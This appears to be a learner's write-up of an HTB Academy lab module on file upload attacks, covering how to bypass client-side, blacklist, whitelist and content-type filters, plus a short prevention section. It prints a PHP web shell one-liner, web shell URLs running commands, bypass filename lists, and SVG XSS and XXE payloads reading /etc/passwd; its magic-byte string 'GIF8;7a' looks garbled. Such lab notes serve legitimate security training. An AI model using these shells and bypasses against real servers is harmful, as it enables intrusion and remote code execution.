# 21 — File Upload Attacks

> **Path Phase:** Web Attacks | **Difficulty:** Medium | **Sections:** 11

Exploiting insecure file uploads to get a web shell — bypassing client-side, blacklist, whitelist, and type filters.

> ℹ️ `{TARGET}` = target. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Intro to File Upload Attacks
2. Absent Validation
3. Upload Exploitation
4. Client-Side Validation
5. Blacklist Filters
6. Whitelist Filters
7. Type Filters
8. Limited File Uploads
9. Other Upload Attacks
10. Preventing File Upload Vulnerabilities
11. Skills Assessment

---

## 1–3 — Absent Validation & Upload Exploitation
```php
http://{TARGET}/uploads/shell.php?cmd=id

> **Basic upload:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 4 — Client-Side Validation
JS-only checks — bypass by intercepting in Burp and changing the filename/content after the JS check.
Burp: upload shell.php renamed shell.jpg → intercept → change back to shell.php

## 5 — Blacklist Filters (bypass blocked extensions)

shell.phtml, shell.php3, shell.php4, shell.php5, shell.phar, shell.pht
shell.pHp # case variation
shell.jpg.php # double extension
shell.php%00.jpg # null byte (old PHP)


## 6 — Whitelist Filters

shell.jpg.php # if regex only checks 'contains .jpg'

combine with LFI or add magic bytes

## 7 — Type Filters (Content-Type + Magic Bytes)
Bypass Content-Type in Burp:

Content-Type: image/jpeg

Bypass magic-byte check (prepend valid image header):

GIF8;7a

<?php system($_GET['cmd']); ?>
> **Filter bypass:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 8 — Limited File Uploads
```xml
<!-- SVG XSS/XXE if only images allowed: -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...
```

## 9 — Other Upload Attacks
Path traversal in filename (`../../shell.php`), zip bombs (DoS), config overwrite, XXE via DOCX/XLSX.

## 10 — Prevention
Whitelist extensions server-side, validate content + magic bytes, randomize filenames, store outside webroot, disable script execution in upload dir.

## 11 — Skills Assessment
1. Identify which filter is in place
2. Craft bypass: shell.php → prepend GIF8;7a, Content-Type: image/gif in Burp
3. Browse to uploaded shell → RCE

http://{TARGET}/uploads/shell.php?cmd=cat /flag.txt

> **Skills Assessment:** ✅ Completed in lab (flag withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept & modify uploads |
| Web shells | PHP/ASPX one-liners |
| `exiftool` | Embed payloads in image metadata |

## 🔑 Key Takeaways
- Bypass layers: **client-side → Content-Type → magic bytes → extension**.
- Alternate PHP extensions (`.phtml`, `.phar`) beat naive blacklists.
- Magic-byte prefix (`GIF8;7a`) fools content-type checks.
- If only images allowed → try SVG for XSS/XXE.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
```
